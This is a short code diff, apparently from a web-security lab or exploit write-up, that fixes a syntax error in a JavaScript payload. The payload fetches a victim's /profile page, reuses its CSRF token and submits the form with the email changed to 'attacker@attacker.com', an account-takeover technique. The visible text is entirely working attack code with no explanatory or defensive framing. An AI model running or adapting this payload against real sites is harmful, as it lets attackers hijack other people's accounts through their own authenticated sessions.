@@ -8,7 +8,7 @@ fetch('/profile')
     
     const params = new URLSearchParams();
     params.append('csrf_token', csrfToken);
-    params.append('username', doc.querySelector('input[name="username"]').value;);
+    params.append('username', doc.querySelector('input[name="username"]').value);
     params.append('firstname', doc.querySelector('input[name="firstname"]').value);
     params.append('lastname', doc.querySelector('input[name="lastname"]').value);
     params.append('email', 'attacker@attacker.com');
